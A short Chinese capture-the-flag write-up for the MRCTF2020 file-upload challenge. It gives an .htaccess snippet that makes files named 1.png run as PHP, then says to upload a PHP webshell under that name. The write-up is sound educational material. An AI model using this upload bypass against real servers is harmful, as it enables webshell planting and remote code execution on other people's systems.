# [MRCTF2020]你传你🐎呢

## 知识点

`.htaccess`

`文件上传`

## 解题

`.htaccess`文件内容

```
<FilesMatch "1.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

再正常传一个`php`木马，将文件名改为`1.png`上传即可

传上去之后 文件名包含`1.png`的文件都会解析为`php`文件